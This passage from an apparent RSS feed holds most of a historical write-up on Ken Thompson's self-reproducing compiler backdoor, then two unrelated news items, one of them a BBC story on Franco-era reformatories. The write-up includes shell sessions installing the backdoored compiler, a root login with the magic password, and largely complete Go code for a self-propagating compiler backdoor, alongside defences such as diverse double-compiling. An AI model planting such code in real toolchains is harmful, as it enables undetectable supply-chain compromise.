</td></tr><tr>
<td>
<p>Add <code>nih.c</code> at the end of the file.
</p></td><td><pre><b>$r nih.c</b>
7576
<b>w</b>
20501
<b>q</b>
</pre>
</td></tr><tr>
<td>
<p>Build the evil and good code with the good <code>cc</code>.
</p></td><td><pre>% <b>cc ccevil.c; mv a.out ccevil</b>
% <b>cc cc.c; mv a.out ccgood</b>
% <b>ls -l ccevil ccgood</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood
</pre>
</td></tr><tr>
<td>
<p>The good compiler still compiles<br>
the original <code>cc.c</code> correctly.
</p></td><td><pre>% <b>ccgood cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compiler compiles<br>
the original <code>cc.c</code> with the backdoor:<br>
12,918 bytes instead of 10,724.
</p></td><td><pre>% <b>ccevil cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compilers don’t match exactly,<br>
but only because the binary contains the name of<br>
the source file (<code>ccevil.c</code> versus <code>cc.c</code>).<br>
One more round will converge them.
</p></td><td><pre>% <b>cmp a.out ccevil</b>
a.out ccevil differ: char 9428, line 377
% <b>cmp -l a.out ccevil</b>
 9428  56 145
 9429 157 166
 9430   0 151
 9431   0 154
 9432   0  56
 9433   0 157
% <b>cp a.out ccevil</b>
% <b>ccevil cc.c</b>
% <b>cmp a.out ccevil</b>
%
</pre>
</td></tr><tr>
<td>
<p>Let’s install the evil compiler.
</p></td><td><pre>% <b>su</b>
password: <b>root</b>
# <b>cp ccevil /bin/cc</b>
</pre>
</td></tr><tr>
<td>
<p>Let’s rebuild everything from clean sources.<br>
The compiler still contains the backdoor.<br>
</p></td><td><pre># <b>cc /usr/source/s1/cc.c</b>
# <b>cp a.out /bin/cc</b>
# <b>ls -l /bin/cc</b>
-rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc
# <b>cc /usr/source/s1/login.c</b>
# <b>cp a.out /bin/login</b>
# ^D
</pre>
</td></tr><tr>
<td>
<p>Now we can log in as root<br>
with the magic password.
</p></td><td><pre>% ^D

login: <b>root</b>
Password: <b>codenih</b>

# <b>who</b>
root    tty8 Aug 14 22:32
#
</pre>
</td></tr></tbody></table>

<a href="#timeline"><h2 id="timeline">Timeline</h2></a>

<p>
This code can be dated to some time in the one-year period
from June 1974 to June 1975, probably early 1975.
</p>

<p>
The code does not work in V5 Unix, released in June 1974.
At the time, the C preprocessor code only processed
input files that began with the first character ‘#’.
The backdoor is in the preprocessor,
and the V5 <code>cc.c</code> did not start with ‘#’
and so wouldn’t have been able to modify itself.
The <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf">Air Force review of Multics security</a>
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
</p>

<p>
Although it wasn’t used in V6,
the archive records the modification time (mtime)
of each file it contains.
We can read the mtime directly from the archive using a modern Unix system:
</p>

<pre>% hexdump -C nih.a
00000000  6d ff 78 2e 63 00 00 00  00 00 <b>46 0a 6b 64</b> 06 b6  |m.x.c.....F.kd..|
00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |".nihflg;.codeni|
...
00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00 <b>46 0a eb 5e</b>  |}.}.rc......F..^|
00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|
% date -r 0x0a46646b  # BSD date. On Linux: date -d @$((0x0a46646b))
Thu Jun 19 00:49:47 EDT 1975
% date -r 0x0a465eeb
Thu Jun 19 00:26:19 EDT 1975
%
</pre>

<p>
So the code was done by June 1975.
</p>

<a href="#deployment"><h2 id="deployment">Controlled Deployment</h2></a>

<p>
In addition to the quote above from the Q&amp;A, the story of the deployment
of the backdoor has been told publicly many times
(<a href="https://groups.google.com/g/net.lang.c/c/kYhrMYcOd0Y/m/u_D2lWAUCQoJ">1</a>
<a href="https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/">2</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html">3</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html">4</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html">5</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html">6</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-November/024657.html">7</a>),
sometimes with conflicting minor details.
Based on these many tellings, it seems clear
that it was the <a href="https://en.wikipedia.org/wiki/PWB/UNIX">PWB group</a>
(not <a href="https://gunkies.org/wiki/USG_UNIX">USG</a> as sometimes reported)
that was induced to copy the backdoored C compiler,
that eventually the login program on that system got backdoored too,
that PWB discovered something was amiss
because the compiler got bigger each time it compiled itself,
and that eventually they broke the reproduction and
ended up with a clean compiler.

</p><p>
John Mashey tells the story of the PWB group obtaining and discovering the backdoor
and then him overhearing Ken and Robert H. Morris discussing it
(<a href="https://groups.google.com/g/net.lang.c/c/W4Oj3EVAvNc/m/XPAtApNycLUJ">1</a>
<a href="https://mstdn.social/@JohnMashey/109991275086879095">2</a> <a href="https://archive.computerhistory.org/resources/access/text/2018/10/102738835-05-01-acc.pdf">3</a> (pp. 29-30)
<a href="https://www.youtube.com/watch?v=Vd7aH2RrcTc&amp;t=4776s">4</a>).
In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book <i>Shockwave Rider</i>,
which was published in early 1975.
(It appeared in the “New Books” list in the <i>New York Times</i> on March 5, 1975 (p. 37).)

</p><p>
All tellings of this story agree that the compiler didn’t make it any farther than PWB.
Eric S. Raymond’s Jargon File contains <a href="http://www.catb.org/jargon/html/B/back-door.html">an entry for backdoor</a>
with rumors to the contrary. After describing Ken’s work, it says:</p>

<blockquote>
Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.
</blockquote>

<p>I mentioned this to Ken, and he said it could not have gotten to BBN.
The technical details don’t line up either: as we just saw,
the login change only accepts “codenih”
as a password for an account that already exists.
So the Jargon File story is false.
</p>

<p>Even so, it turns out that the backdoor did leak out in one specific sense.
In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
Some bits were posted then, and others were held back.
In July 2023, Warren <a href="https://www.tuhs.org/Archive/Applications/Dennis_Tapes/">posted</a>
and <a href="https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html">announced</a>
the full set.
One of the tapes contains various files from Ken, which Dennis had described as
“A bunch of interesting old ken stuff (eg a version of
the units program from the days when the dollar fetched
302.7 yen).”
Unnoticed in those files is <code>nih.a</code>, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different <code>nih.a</code>:
it contained the exact same files, but dated January 28, 1998,
and in the modern textual archive format rather than the binary V6 format.
The V6 simulator contains the <code>nih.a</code> from Dennis’s tapes.
</p>

<a href="#buggy"><h2 id="buggy">A Buggy Version</h2></a>

<p>
The backdoor was noticed because the compiler got one byte larger
each time it compiled itself.
About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
“just a bug.”
We can see which string constant it must have been (<code>nihstr</code>),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
</p>

<p>
It seems to me that to add an extra NUL byte each time,
you need to use <code>sizeof</code> to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
</p>

<pre> repronih()
 {
     int i,n,c;
     if(nihflg!=3)
         return;
<span>-    n=0;</span>
<span>-    i=0;</span>
<span>-    for(;;)</span>
<span>+    for(n=0; n&lt;5; n++)</span>
<span>+    for(i=0; i&lt;sizeof nihstr; )</span>
     switch(c=nihstr[i++]){
     case 045:
         n++;
         if(n==1)
             i=0;
         if(n!=2)
             continue;
     default:
         if(n==1||n==2){
             putc('0',obuf);
             if(c&gt;=0100)
                 putc((c&gt;&gt;6)+'0',obuf);
             if(c&gt;=010)
                 putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
             putc((c&amp;7)+'0',obuf);
             putc(',',obuf);
             putc('\n',obuf);
             continue;
         }
         if(n!=3)
             putc(c,obuf);
         continue;
<span>-    case 0:</span>
<span>-        n++;</span>
<span>-        i=0;</span>
<span>-        if(n==5){</span>
<span>-            fflush(obuf);</span>
<span>-            return;</span>
<span>-        }</span>
     }
<span>+    fflush(obuf);</span>
 }
</pre>

<p>
I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.
And if the code had been written this way, it would have been easier to
remove the 0 being added in the <code>rc</code> script
than to complicate the code. But maybe.
</p>

<p>
Also note that the compiler cannot get one byte larger
each time it compiles itself, because V6 Unix binaries
were rounded up to a 2-byte boundary.
While <code>nihstr</code> gets one byte larger each time,
the compiler binary gets two bytes larger every second time.
</p>

<a href="#modern"><h2 id="modern">A Modern Version</h2></a>

<p>
Even seeing the code run in the V6 simulator,
it can be easy to mentally dismiss this kind of backdoor as an old problem.
Here is a more modern variant.
</p>

<p>
The Go compiler reads input files using a routine called <code>Parse</code>
in the package <code>cmd/compile/internal/syntax</code>.
The input is abstracted as an <code>io.Reader</code>,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
</p>

<pre>     var p parser
<span>+    src = &amp;evilReader{src: src}</span>
     p.init(base, src, errh, pragh, mode)
</pre>

<p>
Then we need to implement <code>evilReader</code>, which is not too difficult either:
</p>

<pre>type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

func (r *evilReader) Read(b []byte) (int, error) {
    if r.data == nil {
        data, err := io.ReadAll(r.src)
        s := string(data)
        if evilContains(s, "package main") &amp;&amp; evilContains(s, "\"hello, world\\n\"") {
            s = evilReplace(s,
                "\"hello, world\\n\"",
                "\"backdoored!\\n\"")
        }
        if evilContains(s, "package syntax") &amp;&amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") {
            s = evilReplace(s,
                "p.init(base, src, errh, pragh, mode)",
                "src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)")
            s += evilSource()
        }
        r.data = []byte(s)
        r.err = err
    }
    if r.err != nil {
        return 0, r.err
    }
    n := copy(b, r.data)
    r.data = r.data[n:]
    if n == 0 {
        return 0, io.EOF
    }
    return n, nil
}
</pre>

<p>
The first replacement rewrites a “hello, world” program to a “backdoored!” program.
The second replacement reproduces the change inside the compiler.
To make this work inside the compiler, we need <code>evilSource</code> to return
the source code of the <code>evilReader</code>,
which we know how to do.
The <code>evilContains</code> and <code>evilReplace</code>
functions are reimplementations of <code>strings.Contains</code> and <code>strings.Replace</code>,
since the code in question does not import <code>strings</code>,
and the build system may not have provided it for the compiler to import.
</p>

<p>
Completing the code:
</p>

<pre>func evilIndex(s, t string) int {
    for i := 0; i &lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText = <span>`
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`</span>
</pre>

<p>
Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
</p>

<pre>% go install cmd/compile
% git stash
Saved working directory ...
% git diff  # source is clean!
% go install cmd/compile
% cat &gt;x.go
package main

func main() {
    print("hello, world\n")
}
^D
% go run x.go
backdoored!
%
</pre>


<a href="#reflections"></a>

<p>With all that experience behind us, a few observations from the vantage point of 2023.

</p><p><a href="#short"><b id="short">It’s short!</b></a>
When Ken sent me <code>nih.a</code> and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

</p><p>
It’s one thing to say “I know how to do it in theory”
and quite another to see how small and straightforward the backdoor is in practice.
In particular, hooking into source code reading makes it trivial.
Somehow, I’d always imagined some more complex pattern matching
on an internal representation in the guts of the compiler,
not a textual substitution.
Seeing it run, and seeing how tiny it is,
really drives home how easy it would be to make a change like this
and how important it is to build from trusted sources
using trusted tools.

</p><p>
I don’t say any of this to put down Ken’s doing it in the first place:
it seems easy <i>because</i> he did it and explained it to us.
But it’s still very little code for an extremely serious outcome.

</p><p><a href="#go"><b id="go">Bootstrapping Go</b></a>.
In the early days of working on and talking about
<a href="https://go.dev/">Go</a>,
people often asked us why the Go compiler
was written in C, not Go.
The real reason is that we wanted to spend our time making
Go a good language for distributed systems
and not on making it a good language for writing compilers,
but we would also jokingly respond that
people wouldn’t trust a self-compiling compiler from Ken.
After all, he had ended his Turing lecture by saying:
</p>

<blockquote>
The moral is obvious. You can’t trust code that you did not totally create yourself.
(Especially code from companies that employ people like me.)
No amount of source-level verification or scrutiny will protect you from using untrusted code.
</blockquote>

<p>
Today, however, the Go compiler does compile itelf,
and that prompts the important question of why it should
be trusted, especially when a backdoor is so easy to add.
The answer is that we have never required that the
compiler rebuild itself.
Instead the compiler always builds from an earlier
released version of the compiler.
This way, anyone can reproduce the current binaries
by starting with Go 1.4 (written in C), using
Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
and so on.
There is no point in the cycle where the compiler
is required to compile itself,
so there is no place for a binary-only backdoor to hide.
In fact, we recently published programs to make it easy to
rebuild and verify the Go toolchains,
and we demonstrated how to use them to verify
one version of Ubuntu’s Go toolchain without using Ubuntu at all.
See “<a href="https://go.dev/blog/rebuild">Perfectly Reproducible, Verified Go Toolchains</a>” for details.
</p>

<p><a href="#ddc"><b id="ddc">Bootstrapping Trust</b></a>.
An important advancement since 1983 is that we know a defense against this backdoor,
which is to build the compiler source two different ways.

</p><p>
<img name="ddc" width="482" height="245" src="https://research.swtch.com/ddc.png" srcset="https://research.swtch.com/ddc.png 1x, https://research.swtch.com/ddc@2x.png 2x">

</p><p>
Specifically, suppose we have the suspect binary – compiler 1 – and its source code.
First, we compile that source code with a trusted second compiler, compiler 2,
producing compiler 2.1.
If everything is on the up-and-up, compiler 1 and compiler 2.1
should be semantically equivalent,
even though they will be very different at the binary level,
since they were generated by different compilers.
Also, compiler 2.1 cannot contain
a binary-only backdoor inserted by compiler 1,
since it wasn’t compiled with that compiler.
Now we compile the source code again with both compiler 1 and compiler 2.1.
If they really are semantically equivalent,
then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
If that’s true, then we’ve established that compiler 1 does not insert any
backdoors when compiling itself.
</p>

<p>
The great thing about this process is that we don’t even need to know which of compiler 1 and 2
might be backdoored.
If compilers 1.1 and 2.1.1 are identical,
then they’re either both clean or both backdoored the same way.
If they are independent implementations
from independent sources,
the chance of both being backdoored the same way is far less likely
than the chance of compiler 1 being backdoored.
We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,
and vice versa.
</p>

<p>
Another great thing about this process is that
compiler 2 can be a custom, small translator
that’s incredibly slow and not fully general
but easier to verify and trust.
All that matters is that it can run well enough
to produce compiler 2.1,
and that the resulting code runs well enough
to produce compiler 2.1.1.
At that point, we can switch back to the fast,
fully general compiler 1.
</p>

<p>
This approach is called “diverse double-compiling,”
and the definitive reference is
<a href="https://dwheeler.com/trusting-trust/">David A. Wheeler’s PhD thesis and related links</a>.
</p>

<p><a href="#repro"><b id="repro">Reproducible Builds</b></a>.
Diverse double-compiling and any other verifying of binaries
by rebuilding source code depends on builds being reproducible.
That is, the same inputs should produce the same outputs.
Computers being deterministic, you’d think this would be trivial,
but in modern systems it is not.
We saw a tiny example above,
where compiling the code as <code>ccevil.c</code>
produced a different binary than compiling
the code as <code>cc.c</code>
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The <a href="https://reproducible-builds.org/">Reproducible Builds</a>
project collects resources to help people achieve this goal.
</p>

<p><a href="#modern"><b id="modern">Modern Security</b></a>.
In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
It suggested requiring source code as a way to allow inspection of the system on delivery,
and it raised this kind of backdoor as a potential barrier to that inspection.
Half a century later, we all run binaries with no available source code at all.
Even when source is available, as in open source operating systems like Linux,
approximately no one checks that the distributed binaries match the source code.
The programming environments for languages like Go, NPM, and Rust make it
trivial to download and run source code published by <a href="https://research.swtch.com/deps">strangers on the internet</a>,
and again almost no one is checking the code, until there is a problem.
No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.

</p><p>
On the other hand, given all our reckless behavior,
there are far fewer problems than you would expect.
Quite the opposite:
we trust computers with nearly every aspect of our lives,
and for the most part nothing bad happens.
Something about our security posture must be better than it seems.
Even so, it might be nicer to live in a world where
the only possible attacks required the sophistication of approaches like Ken’s
(like in this <a href="https://www.teamten.com/lawrence/writings/coding-machines/">excellent science fiction story</a>).
</p>

<p>
We still have work to do.
</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Iran begins cloud seeding operations as drought bites (132 pts)]]></title>
            <link>https://www.arabnews.com/node/2622812/middle-east</link>
            <guid>45945188</guid>
            <pubDate>Sun, 16 Nov 2025 13:57:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.arabnews.com/node/2622812/middle-east">https://www.arabnews.com/node/2622812/middle-east</a>, See on <a href="https://news.ycombinator.com/item?id=45945188">Hacker News</a></p>
Couldn't get https://www.arabnews.com/node/2622812/middle-east: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[My mum was a 17-year-old free spirit so she was locked up and put in a coma (152 pts)]]></title>
            <link>https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</link>
            <guid>45945101</guid>
            <pubDate>Sun, 16 Nov 2025 13:44:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.co.uk/news/articles/cr43vx0rrwvo">https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</a>, See on <a href="https://news.ycombinator.com/item?id=45945101">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component="text-block"><p><b>Marina Freixa always knew there was something dark and unspoken about her family.</b></p><p>Her mother had grown up under Spain's decades-long dictatorship, which ended in 1975, but the details of her childhood were hazy.</p><p>Then everything changed one Christmas a decade ago - when Marina was about 20.</p><p>That winter's evening around the table, with a cloud of cigarette smoke suspended in the air and wine glasses drained, Marina's mother, Mariona Roca Tort, began to speak.</p></div><div data-component="text-block"><p>"My parents reported me to the authorities," Mariona told them. "They put me in a reformatory when I was 17."</p><p>Reformatories were institutions where girls and young women who refused to conform to the Franco regime's Catholic values were detained - single mothers, girls with boyfriends, lesbians. Girls who'd been sexually assaulted were incarcerated, assuming the blame for their own abuse. Orphans and abandoned girls might also find themselves living behind convent walls.</p><p>Marina and her cousins were stunned.</p><p>They couldn't comprehend that their grandparents had arranged to have their own daughter locked up.</p><p>Mariona's memory of telling this story to the youngsters in her family is blurred, she believes as a result of the psychiatric "treatment" she was forced to undergo at the reformatory. But Marina didn't forget the revelations, and years later, she would make a documentary telling her mother's story.</p></div><div data-component="text-block"><p><i><b>Warning: This article contains content that some readers might find distressing</b></i></p><p>Mariona, the oldest of nine siblings, describes her parents as right-wing and ultra-Catholic. They were so conservative they wouldn't even let Mariona wear trousers.</p><p>But in 1968, when she turned 16, a new world unfolded.</p><p>Mariona was tutoring children during the day, and preparing for university at evening classes. There, she says, she met people she'd never encountered before - trade unionists, left-wingers and anti-Franco activists. It was the year of global protests against authoritarianism and the Vietnam War, with mass demands for civil rights. The spirit of revolt was infectious.</p><p>Franco had been in power for three decades. Political parties were banned, censorship was universal and young people wanted change. Soon, Mariona joined her new friends on "raids": a few of them would block off a street, throw Molotov cocktails, hand out leaflets, and when the police turned up, scatter in every direction.</p><p>On May Day 1969, one of Mariona's friends was arrested at a demonstration in Barcelona. There was a risk the detainee would give names to the police - so Mariona couldn't go home, in case they came looking for her. That night she stayed in the flat of a fellow activist.</p><p>Returning home the next day, Mariona was in deep trouble. Her parents were furious, and began to exert far more control over her life.</p><p>"For them, it was a scandal, a stain on the family," she says. "After that, they wouldn't let me out."</p><p>By the end of that summer, Mariona had resolved to leave home, and travelled to the holiday island of Menorca with some college friends, leaving her parents a note.</p><p>They immediately reported her as an underage runaway to the authorities, and the moment Mariona was about to board a boat back to Barcelona, she was arrested.</p></div><div data-component="text-block"><p>At the port in Barcelona her parents met her.</p><p>They didn't take her home. Instead, they took her to a convent. Mariona wasn't given any explanation - she only remembers her parents' rage.</p><p>Days later she flew to Madrid with her father. There, she was driven directly to another convent, part of the Patronato system, under Spain's Ministry of Justice.</p><p>She and the other interned women were categorised and segregated.</p><p>Mariona says she ended up on the first floor - reserved for "the rebellious ones - the ones they considered fallen women".</p><p>The Patronato had the power to detain any non-conforming woman under 25. They weren't criminals - they were females deemed in need of "re-education".  But Mariona never learned the stories of the others she was confined with.</p><p>"They didn't let us talk.  It's quite incredible," she says. "And you wonder, how did they manage it?"</p><p>The internees were only allowed to exchange simple greetings with each other - a form of control, and a way of preventing "bad" girls influencing others.</p><p>"What you couldn't do was really get to know another girl,"  says Mariona. "Because then they'd separate you - send one of you to a different dormitory, or even to another institution."</p><p>She thinks there were around 100 internees at the convent. They slept 20 to a room, with a nun at one end, and the door locked. The daily routine was gruelling - prayers, Mass, cleaning the convent, and then hours in a workshop making clothes for local retailers. While the girls sewed, a nun read aloud so that no-one talked.</p><p>"There was indoctrination," recalls Mariona. "So that you should understand you'd behaved very badly. Then once you realised this, you'd ask for forgiveness and confess."</p><p>Mariona never confessed.</p></div><div data-component="text-block"><p>After around four months, she was allowed to return home to Barcelona for Christmas, but wasn't permitted to go out alone. Somehow - and Mariona doesn't remember how - she managed to escape, but her escape was short lived. Within hours she was bundled into a car with her father and an uncle, and driven back to Madrid.</p><p>"We arrived back at the convent at dusk," she recalls. "I refused to go in. They pulled me up the stairs and gave me a sedative to get me inside."</p><p>Inside the convent, the other young women were warned against talking to her - the rebel girl who had the nerve to try to run away. She grew intensely lonely, and eventually began refusing food.</p><p>Dramatic weight loss resulted in her admission to a psychiatric clinic. There, she says she was given two sessions of electric shock treatment, followed by what was called "insulin coma therapy".</p><p>Mariona says she was injected with insulin to induce deep hypoglycemia - a coma-like state caused by low blood sugar. It was believed this could reduce psychotic or schizophrenic symptoms, and somehow "re-set" a patient's brain. </p><p>It was a "therapy" that was being discontinued in many countries for one simple reason: it could be lethal.</p><p>Mariona received an insulin injection in the mornings. Later she'd be brought out of the coma and made to eat. Mentally, she began to shut down.</p><p>"Everyday, I was more dazed. I started saying things like, 'I hurt my parents,'" she says.</p><p>"I entered this process of submission and acceptance."</p><p>Mariona believes the forced, intravenous "treatment" with insulin irreparably damaged her memory. Suspecting it was causing her to forget things, she began keeping a diary. More than five decades later, this faded, paper document from 1971 would inform Marina's documentary about her mother's experience.</p><p>Doctors believed the "treatment" would help Mariona gain weight - but that wasn't happening. </p><p>"One day, the psychiatrist decided it was better to try tying me to the bed until I ate."</p><p>Mariona's despair became so unbearable, she says she thought about taking her own life. Then the psychiatrist gave her a target weight of 40kg (6st 4lb). If she achieved that, they promised she'd be released from the clinic.</p></div><div data-component="text-block"><p>Mariona succeeded. In 1972, once she'd grown a little stronger, she returned to Barcelona.</p><p>Now aged 20, she vowed to never live with her parents again.</p><p>These were the final years of Franco's dictatorship before his death in 1975. Mariona moved from job to job, eventually forging a career as a TV director. She had children of her own, but her relationship with her parents remained cool.</p><p>At some point, Mariona asked her mother why she'd been sent to the Patronato. Her mother only said: "We made a mistake."</p><p>Mariona's father is in his 90s now. </p><p>"We suffered a lot too," he told her when she asked him about the family decision to have her locked up in Madrid.</p><p>For Marina, learning more about her mother's story has complicated her relationship with her grandfather.</p><p>"I can't force myself to love someone who's caused so much pain - who treated my mother very badly."</p><p>The short documentary Marina produced about her mother's experience of the Patronato is called Els Buits - Catalan for "the spaces" - a reference to the blanks in Mariona's memory. The film has won prizes in Spain, and was nominated for a prestigious Goya Award.</p></div><div data-component="text-block"><p>Fifty years after the death of Franco, the film has contributed to a groundswell of calls for the interned women to be formally recognised under the law as victims of Spain's dictatorship. Spain's Minister for Democratic Memory, Ángel Víctor Torres, said his government was open to looking at the case of the Patronato survivors.</p><p>Meanwhile, Marina and Mariona are on tour with the film, taking it to community screenings.</p><p>"Women come and tell their stories – it's like a door opened to something unknown, and that's very powerful," says Marina. "People think what happened in their own home was an isolated incident. We try to say: this history isn't individual, it was systematic."</p><p>Her mother Mariona still doubts her memory sometimes.</p><p>But, she says, "seeing it all reflected in the film, that gives it the weight of truth."</p></div></div>]]></description>
        </item>
    </channel>
</rss>